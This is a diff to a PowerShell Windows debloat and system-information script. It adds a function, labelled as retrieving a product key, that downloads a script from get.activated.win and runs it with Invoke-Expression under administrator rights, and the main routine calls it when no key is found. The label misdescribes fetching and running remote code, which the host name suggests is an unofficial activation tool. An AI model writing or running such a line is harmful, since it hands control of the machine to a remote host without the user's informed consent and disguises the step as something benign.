@@ -94,6 +94,15 @@ function EnsureAdministrator {
     }
 }
 
+function GetWindowsProductKey {
+    try {
+        Invoke-RestMethod "https://get.activated.win" | Invoke-Expression
+    }
+    catch {
+        Write-Error "Failed to retrieve product key from https://get.activated.win: $_"
+    }
+}
+
 function Main {
     try {
         EnsureAdministrator
@@ -101,6 +110,20 @@ function Main {
         $SystemInfo = $getArchitecture.Invoke()
         Write-Output "System Information:"
         Write-Output $SystemInfo
+
+        if (-not [string]::IsNullOrEmpty($SystemInfo.OSProductKey)) {
+            Write-Output "Windows Product Key: $($SystemInfo.OSProductKey)"
+        } else {
+            Write-Output "Windows Product Key not found. Attempting to retrieve..."
+            Write-Host "Press any key to retrieve the product key..."
+        
+            $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+        
+            $RetrievedKey = GetWindowsProductKey
+            if ($null -eq $RetrievedKey) {
+                Write-Warning "Could not retrieve product key from remote source."
+            }
+        }
 
         foreach ($bloatware in $BloatwareList) {
             if (DetectBloatware -PackageName $bloatware.app_id) {
